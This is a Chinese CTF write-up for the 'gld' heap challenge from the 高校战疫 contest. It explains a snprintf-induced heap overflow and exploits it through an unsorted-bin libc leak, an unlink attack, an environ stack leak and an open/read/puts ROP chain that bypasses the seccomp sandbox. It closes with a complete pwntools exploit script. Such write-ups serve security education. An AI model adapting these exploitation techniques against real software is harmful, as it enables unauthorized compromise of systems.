

# gld

## 来源

高校战疫


## 难度

6 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    
 logan@LYXF:~/share/lgd$ seccomp-tools dump ./lgd
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x02 0x00 0x40000000  if (A >= 0x40000000) goto 0006
 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x06 0x00 0x00 0x00000000  return KILL
 ```

## 简单描述

有5个功能, 添加, 删除, 打印, 修改, 退出.没有开启EIP, 通过检查seccomp-tools检查, 开启了沙箱,不能get shell方式获取flag, 开了一个BCF(虚假控制流)
## vul

```c
    sub_400896(dword_603010, dword_60303C + 1, dword_603040);
      }
      size = snprintf(byte_6033E0, size, "%s", &unk_603060);//vul: 通过字符长度来重新设置大小
      if ( dword_60303C / dword_603010 > 1 )
      {
        if ( dword_60303C % dword_603010 )
        {
          if ( dword_60303C % dword_603010 != dword_60303C / dword_603010 || dword_603040 )
          {
            if ( dword_60303C % dword_603010 <= 1 || dword_60303C % dword_603010 >= dword_60303C / dword_603010 )
```

若输入的字符长度大于所输入的大小,造成堆溢出.

## 知识点

unsorted bin split, unlink attack, environ, seccomp, rop

## 思路

通过unsoted bin 分割堆块溢出libc基址, 使用unsoted bin taack 打入指针数组, 泄漏environ中的stack地址, 劫持修改功能的ret栈地址, 由于开了沙箱, 那就只能通过open, read, puts来获取方式来打印flag了.

## 利用

### 堆布局

```python
	sla('name?', 'I0gan')
	ad(0x68, 'A' * 0x100) # idx 0 通过溢出修改chunk 1为 small bin
	ad(0x68, 'A' * 0x78) # idx 1 为了分割unsoted bin,使 main_arena 到 chunk 2中
	ad(0x68, 'A' * 0x78) # idx 2 为了打印 main_arena
	ad(0x68, 'A' * 0x78) # idx 3 不让top chunk 合并, 其实不用也行
```

### 获取libc

```python
	p = 'A' * 0x60
	p += p64(0)
	p += p64(0xe1)
	md(0, p) # 修改 chunk 1为small bin然后释放
	rm(1)
	ad(0x68, 'A' * 0x78) #分割 chunk 1 (unsoted bin)使main_arena 跑到 chunk 2中
	dp(2) # 打印main_arena + 88处地址
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x3c4b20 - 88
	li('libc_base ' + hex(lib.address))
```

### unsoted bin attack 掌控管理指针的数组

```python
	# 恢复刚才所使用的small bin 为fast bin
	p = 'A' * 0x60
	p += p64(0)
	p += p64(0x71)
	md(0, p)

	# unlink attack to list
	ad(0x80, 'A') #idx 4
	# fake chunk
	plist = 0x6032f8 # 管理当前chunk的地址
	p = p64(0) # prev_size
	p += p64(0x61) # size
	p += p64(plist - 0x18) # fd
	p += p64(plist - 0x10) # bk
	p += p64(0x60) # next_size
	p = p.ljust(0x60, '\x00') 
	p += p64(0x60) # prev_size
	p += '\x90' # size
	md(3, p)
	rm(4) # 合并堆块,触发unlink
```

### 获取stack地址

```python
	# leak stack
	'''
	in exe
	4023b3 : pop rdi ; ret
	4023b1 : pop rsi ; pop r15 ; ret
	400711 : ret

	in libc
	0x33544 : pop rax ; ret


	read
	1 RDI  0x0
	2 RSI  0x7fffffffec18 —▸ 0x402327 
	3 RDX  0x78

	'''
	pop_rdi = 0x4023b3
	pop_rsi_r15 = 0x4023b1
	ret = 0x400711
	pop_rax = lib.address + 0x33544
	pop_rdx = lib.address + 0x1b92

	md(3, p64(lib.sym['_environ'])) # 将管理chunk 0的指针改为 libc中的_environ地址
	dp(0)
	environ = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') # 泄漏stack中的environ地址 
	li('environ ' + hex(environ))
	md_ret = environ - (0xee38 - 0xec18) # 计算 修改功能的ret地址
	li('md_ret ' + hex(md_ret))
```

### 构造rop链

通过open, read, puts函数实现flag的打印

```python
	md(3, p64(md_ret))
	puts_plt = exe.plt['puts']
	# creat rop
	flag = md_ret + 0x8 * 19
	p = p64(pop_rdi) + p64(flag)
	p += p64(pop_rsi_r15) + p64(0) + p64(0)
	p += p64(pop_rdx) + p64(0)
	p += p64(lib.sym['open']) # 8
	
	# read
	p += p64(pop_rdi) + p64(0x3)
	p += p64(pop_rsi_r15) + p64(flag) + p64(0)
	p += p64(pop_rdx) + p64(0x60)
	p += p64(lib.sym['read']) # 8
	
	p += p64(pop_rdi) + p64(flag)
	p += p64(lib.sym['puts'])
	p += './flag\x00'


	sla('>> ', str(4))
	sla('?', str(0))
	#db()
	sa('?', p)
```

## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'lgd'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'
#libFile = './libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('>> ', str(1))
	sla('_?', str(size))
	sa('no?', data)

def rm(idx):
	sla('>> ', str(2))
	sla('?', str(idx))

def dp(idx):
	sla('>> ', str(3))
	sla('?', str(idx))

def md(idx, data):
	sla('>> ', str(4))
	sla('?', str(idx))
	sa('?', data)

def q():
	sla('>> ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	sla('name?', 'I0gan')
	ad(0x68, 'A' * 0x100) # idx 0
	ad(0x68, 'A' * 0x78) # idx 1
	ad(0x68, 'A' * 0x78) # idx 2
	ad(0x68, 'A' * 0x78) # idx 3

	p = 'A' * 0x60
	p += p64(0)
	p += p64(0xe1)
	md(0, p)
	rm(1)
	ad(0x68, 'A' * 0x78)
	dp(2)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x3c4b20 - 88
	li('libc_base ' + hex(lib.address))

	# recover bin
	p = 'A' * 0x60
	p += p64(0)
	p += p64(0x71)
	md(0, p)

	# unlink attack to list
	ad(0x80, 'A') #idx 4
	# fake chunk
	plist = 0x6032f8
	p = p64(0)
	p += p64(0x61)
	p += p64(plist - 0x18)
	p += p64(plist - 0x10)
	p += p64(0x60)
	p = p.ljust(0x60, '\x00')
	p += p64(0x60)
	p += '\x90'
	md(3, p)
	rm(4)

	# leak stack
	'''
	in exe
	4023b3 : pop rdi ; ret
	4023b1 : pop rsi ; pop r15 ; ret
	400711 : ret

	in libc
	0x33544 : pop rax ; ret

	read
	1 RDI  0x0
	2 RSI  0x7fffffffec18 —▸ 0x402327 
	3 RDX  0x78

	'''
	pop_rdi = 0x4023b3
	pop_rsi_r15 = 0x4023b1
	ret = 0x400711
	pop_rax = lib.address + 0x33544
	pop_rdx = lib.address + 0x1b92

	md(3, p64(lib.sym['_environ']))
	dp(0)
	environ = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	li('environ ' + hex(environ))
	md_ret = environ - (0xee38 - 0xec18)
	li('md_ret ' + hex(md_ret))

	md(3, p64(md_ret))
	puts_plt = exe.plt['puts']
	# creat rop
	flag = md_ret + 0x8 * 19
	p = p64(pop_rdi) + p64(flag)
	p += p64(pop_rsi_r15) + p64(0) + p64(0)
	p += p64(pop_rdx) + p64(0)
	p += p64(lib.sym['open']) # 8
	
	# read
	p += p64(pop_rdi) + p64(0x3)
	p += p64(pop_rsi_r15) + p64(flag) + p64(0)
	p += p64(pop_rdx) + p64(0x60)
	p += p64(lib.sym['read']) # 8
	
	p += p64(pop_rdi) + p64(flag)
	p += p64(lib.sym['puts'])
	p += './flag\x00'


	sla('>> ', str(4))
	sla('?', str(0))
	#db()
	sa('?', p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
```

